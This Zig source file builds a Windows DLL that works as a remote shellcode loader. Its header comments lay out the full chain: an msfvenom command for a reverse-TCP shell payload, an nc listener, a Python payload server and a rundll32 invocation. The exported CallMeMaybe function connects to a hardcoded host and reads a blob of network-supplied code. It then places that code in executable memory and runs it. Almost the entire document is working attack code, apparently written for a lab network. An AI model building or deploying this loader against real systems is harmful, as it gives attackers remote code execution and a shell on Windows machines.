// docker run --rm -v $(pwd):/tmp -it --entrypoint ./msfvenom metasploitframework/metasploit-framework -p windows/x64/shell_reverse_tcp -a x64 LHOST=192.168.56.104 LPORT=55555 --platform windows -f raw -o /tmp/payload.bin
// nc -nvl 192.168.56.104 55555
// python3 ReflectDLL_windows.py --dll payload.bin --bind 192.168.56.104:10101
// C:\windows\system32\rundll32.exe RemoteShellcode.dll,CallMeMaybe

// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const std = @import("std");
const windows = std.os.windows;

const win32 = @import("win32").everything;

pub export fn CallMeMaybe() void {
    var gpa = std.heap.DebugAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var threaded: std.Io.Threaded = .init(allocator, .{});
    defer threaded.deinit();
    const io = threaded.io();
    const LHOST = "192.168.56.104";
    const LPORT = 10101;

    std.log.debug("Connecting to server {s}:{d}", .{ LHOST, LPORT });

    const addr = std.Io.net.IpAddress.parse(LHOST, LPORT) catch return;
    const stream = addr.connect(io, .{
        .mode = .stream,
    }) catch return;
    defer stream.close(io);

    // Backing buffer for the reader (must be >= largest single read)
    var read_buf: [8192]u8 = undefined;
    var stream_reader = stream.reader(io, &read_buf);
    const reader: *std.Io.Reader = &stream_reader.interface;

    // Read u32 size prefix
    std.log.debug("Reading size", .{});
    reader.fill(@sizeOf(u32)) catch {
        std.log.err("[-] Failed to read DLL size", .{});
        return;
    };
    const dllSize = reader.takeInt(u32, .big) catch return;

    std.log.debug("Read size: {d}", .{dllSize});

    // Sanity check before trusting the network-supplied size
    const MAX_DLL_SIZE: u32 = 64 * 1024 * 1024; // 64 MB
    const MIN_DLL_SIZE: u32 = 64; // a valid PE is never this small...right?

    if (dllSize < MIN_DLL_SIZE or dllSize > MAX_DLL_SIZE) {
        std.log.err("[-] DLL size {d} out of acceptable range [{d}, {d}]", .{
            dllSize, MIN_DLL_SIZE, MAX_DLL_SIZE,
        });
        return;
    }

    const pHandle: ?win32.HANDLE = win32.GetCurrentProcess();

    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    const mem = win32.VirtualAllocEx(
        pHandle,
        null,
        dllSize,
        .{
            .COMMIT = 1,
            .RESERVE = 1,
        },
        win32.PAGE_EXECUTE_READWRITE,
    );

    if (mem == null) {
        std.log.err("[-] Failed to VirtualAllocEx DLL", .{});
        return;
    }
    const mem_slice = @as([*]u8, @ptrCast(mem.?))[0..dllSize];
    reader.readSliceAll(mem_slice) catch return;

    const entry_point = @as(*const fn () void, @ptrCast(mem_slice.ptr));

    entry_point();

    _ = win32.MessageBoxA(null, "failed", "oh shits...", .{});
}

pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: windows.LPVOID) windows.BOOL {
    _ = lpReserved;
    _ = hinstDLL;
    _ = fdwReason;

    return .TRUE;
}
